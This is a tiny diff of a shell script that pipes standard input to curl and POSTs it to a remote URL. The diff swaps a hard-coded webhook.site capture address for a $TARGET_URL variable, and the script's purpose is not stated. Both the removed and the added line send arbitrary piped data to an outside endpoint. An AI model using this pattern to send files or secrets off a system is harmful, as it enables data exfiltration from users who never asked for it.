@@ -1,4 +1,4 @@
 #!/bin/sh
 
 
-cat | curl -d@- "https://webhook.site/1865c395-b8a5-4a65-9111-beffe20ee594"
+cat | curl -d@- "$TARGET_URL"
